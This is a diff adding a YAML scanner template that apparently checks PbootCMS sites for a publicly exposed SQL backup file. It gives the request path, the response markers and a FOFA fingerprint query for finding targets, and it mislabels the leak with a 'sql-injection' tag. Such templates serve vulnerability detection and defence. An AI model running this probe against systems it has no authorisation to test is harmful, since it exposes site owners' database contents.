@@ -1,0 +1,16 @@
+id: poc-yaml-pbootcms-backup-sql-info-leak
+info:
+  name: PbootCMS pbootcms_v310.sql 信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: pbootcms
+  fofa: header="PbootCMS" || body="zbeol.com"
+requests:
+- method: GET
+  path: /static/backup/sql/pbootcms_v310.sql
+  expression: status_code == 200 && contains(body,"Online Database Management") &&
+    contains(body,"INSERT INTO") && contains(body,"CREATE TABLE") && contains(body,"表的结构")
+    && !contains(body,"<html") && contains(headers,"text/x-sql")
+variables: {}
+transport: http
